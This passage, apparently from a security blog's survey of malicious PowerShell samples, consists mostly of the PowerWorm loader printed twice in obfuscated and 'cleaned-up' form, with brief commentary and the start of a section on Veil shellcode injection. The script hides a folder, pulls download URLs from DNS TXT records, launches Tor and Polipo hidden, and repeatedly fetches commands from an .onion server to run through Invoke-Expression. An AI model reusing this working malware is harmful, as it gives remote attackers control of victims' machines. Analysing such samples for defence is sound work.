class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-sy">.</span><span class="crayon-v">proxy</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">zpp</span><span class="crayon-sy">;</span><span class="crayon-s">'gEkdkGPjVp'</span><span class="crayon-sy">;</span><span class="crayon-s">'xerooSjz'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ca</span><span class="crayon-o">=</span><span class="crayon-s">'http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&amp;amp;uid='</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-sy">;</span><span class="crayon-s">'SGCFq'</span><span class="crayon-sy">;</span><span class="crayon-s">'GkVVnp'</span><span class="crayon-sy">;</span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-sy">.</span><span class="crayon-e">downloadString</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ca</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-s">'rHo'</span><span class="crayon-sy">;</span><span class="crayon-s">'jtshvrR'</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">ne</span><span class="crayon-h"> </span><span class="crayon-s">'none'</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span><span class="crayon-s">'Ju'</span><span class="crayon-sy">;</span><span class="crayon-s">'VuUTlp'</span><span class="crayon-sy">;</span><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-sy">;</span><span class="crayon-s">'blhE'</span><span class="crayon-sy">;</span><span class="crayon-s">'AeIepyNd'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-s">'whSp'</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0033 seconds] -->
<p>Cleaned-up slightly –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c985372299832" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ErrorActionPreference = 'SilentlyContinue';
$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;

if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $kn) {;
	(Get-Process -id $pid).Kill();
};

function e($dkez){;
	$jt = (((iex "nslookup -querytype=txt $dkez 8.8.8.8") -match '"') -replace '"', '')[0].Trim();
	$ovg.DownloadFile($jt, $tg);
	$ei = $ke.NameSpace($tg).Items();
	$ke.NameSpace($sa).CopyHere($ei, 20);
	rd $tg;
};

$sa = $env:APPDATA + '\' + $kn;
if (!(Test-Path $sa)){;
	$qr = New-Item -ItemType Directory -Force -Path $sa;
	$qr.Attributes = "Hidden", "System", "NotContentIndexed";
};	

$zul=$sa+ '\tor.exe';
$axs=$sa+ '\polipo.exe';
$tg=$sa+'\'+$kn+'.zip';
$ovg=New-Object System.Net.WebClient;
$ke=New-Object -C Shell.Application;

if (!(Test-Path $zul) -or !(Test-Path $axs)){;
	e 'i.vankin.de';
};
if (!(Test-Path $zul) -or !(Test-Path $axs)){;
	e 'gg.ibiz.cc';
};

$pj=$sa+'\roaminglog';
saps $zul -Ar " --Log `"notice file $pj`"" -wi Hidden;

do{
	sleep 1;
	$xxl=gc $pj
} while(!($xxl -match 'Bootstrapped 100%: Done.'));

saps $axs -a "socksParentProxy=localhost:9050" -wi Hidden;
sleep 7;
$zpp=New-Object System.Net.WebProxy("localhost:8123");
$zpp.useDefaultCredentials = $true;
$ovg.proxy=$zpp;
$ca='http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=&amp;amp;uid=' + $kn;

while(!$qmh){
	$qmh=$ovg.downloadString($ca)
};

if ($qmh -ne 'none'){;
	iex $qmh;
};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-28">28</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-30">30</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-32">32</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-34">34</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-36">36</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-38">38</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-40">40</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-42">42</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-44">44</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-46">46</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-48">48</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-50">50</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-52">52</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-54">54</div><div class="crayon-num" data-line="crayon-60a9b96a2c985372299832-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c985372299832-56">56</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c985372299832-1"><span class="crayon-sy">$</span><span class="crayon-v">ErrorActionPreference</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'SilentlyContinue'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-2"><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">get</span><span class="crayon-o">-</span><span class="crayon-e">wmiobject </span><span class="crayon-v">Win32_ComputerSystemProduct</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">UUID</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-4"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">gp </span><span class="crayon-v">HKCU</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-v">Software</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-v">Run</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-5"><span class="crayon-h">	</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Process</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">id</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pid</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Kill</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-6"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-8"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">dkez</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-9"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">jt</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-s">"nslookup -querytype=txt $dkez 8.8.8.8"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-s">'"'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">replace</span><span class="crayon-h"> </span><span class="crayon-s">'"'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">Trim</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-10"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">jt</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">tg</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-11"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">ei</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ke</span><span class="crayon-sy">.</span><span class="crayon-t">NameSpace</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">tg</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Items</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-12"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">ke</span><span class="crayon-sy">.</span><span class="crayon-t">NameSpace</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">sa</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">CopyHere</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ei</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-13"><span class="crayon-h">	</span><span class="crayon-i">rd</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">tg</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-14"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-15">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-16"><span class="crayon-sy">$</span><span class="crayon-v">sa</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">APPDATA</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">'\' + $kn;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-17"><span class="crayon-s">if (!(Test-Path $sa)){;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-18"><span class="crayon-s">	$qr = New-Item -ItemType Directory -Force -Path $sa;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-19"><span class="crayon-s">	$qr.Attributes = "Hidden", "System", "NotContentIndexed";</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-20"><span class="crayon-s">};	</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-22"><span class="crayon-s">$zul=$sa+ '</span><span class="crayon-sy">\</span><span class="crayon-v">tor</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">';</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-23"><span class="crayon-s">$axs=$sa+ '</span><span class="crayon-sy">\</span><span class="crayon-v">polipo</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">';</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-24"><span class="crayon-s">$tg=$sa+'</span><span class="crayon-sy">\</span>'<span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-o">+</span><span class="crayon-s">'.zip'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-25"><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-26"><span class="crayon-sy">$</span><span class="crayon-v">ke</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">C</span><span class="crayon-h"> </span><span class="crayon-v">Shell</span><span class="crayon-sy">.</span><span class="crayon-v">Application</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-28"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">zul</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">axs</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-29"><span class="crayon-h">	</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-s">'i.vankin.de'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-30"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-31"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">zul</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">axs</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-32"><span class="crayon-h">	</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-s">'gg.ibiz.cc'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-33"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-34">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-35"><span class="crayon-sy">$</span><span class="crayon-v">pj</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">sa</span><span class="crayon-o">+</span><span class="crayon-s">'\roaminglog'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-36"><span class="crayon-i">saps</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">zul</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Ar</span><span class="crayon-h"> </span><span class="crayon-s">" --Log `"</span><span class="crayon-e">notice </span><span class="crayon-i">file</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pj</span><span class="crayon-sy">`</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">wi </span><span class="crayon-v">Hidden</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-37">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-38"><span class="crayon-st">do</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-39"><span class="crayon-h">	</span><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-40"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">xxl</span><span class="crayon-o">=</span><span class="crayon-i">gc</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">pj</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-41"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">xxl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-s">'Bootstrapped 100%: Done.'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-42">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-43"><span class="crayon-i">saps</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">axs</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-s">"socksParentProxy=localhost:9050"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">wi </span><span class="crayon-v">Hidden</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-44"><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-45"><span class="crayon-sy">$</span><span class="crayon-v">zpp</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-e">WebProxy</span><span class="crayon-sy">(</span><span class="crayon-s">"localhost:8123"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-46"><span class="crayon-sy">$</span><span class="crayon-v">zpp</span><span class="crayon-sy">.</span><span class="crayon-v">useDefaultCredentials</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-47"><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-sy">.</span><span class="crayon-v">proxy</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">zpp</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-48"><span class="crayon-sy">$</span><span class="crayon-v">ca</span><span class="crayon-o">=</span><span class="crayon-s">'http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=&amp;amp;uid='</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-49">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-50"><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-51"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-sy">.</span><span class="crayon-e">downloadString</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ca</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-52"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-53">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-54"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">ne</span><span class="crayon-h"> </span><span class="crayon-s">'none'</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c985372299832-55"><span class="crayon-h">	</span><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">qmh</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c985372299832-56"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0026 seconds] -->
<p>The code will download Tor and Polipo by fetching download URL’s for the software from DNS TXT records and then eventually use the software to continuously check for new PowerShell commands that get passed to Invoke-Expression. Matt Graeber has done an <a href="http://www.exploit-monday.com/2014/04/powerworm-analysis.html">excellent job</a> of analyzing the full capabilities of this malware and provides de-obfuscated, commented, versions of the underlying PowerShell.</p>
<p><strong>Veil Stream (7 Samples – 0.17% Coverage)</strong></p>
<p>This is a similar technique as described in the “Powerfun Reverse” variant. The PowerShell code is injected into memory from a base64 string and executed with Invoke-Expression that eventually launches the actual shellcode payload. The layout of the code correlates to the <a href="https://github.com/Veil-Framework/Veil-Evasion/blob/master/modules/payloads/powershell/shellcode_inject/virtual.py">Veil Framework</a> implementation.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c988710163068" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
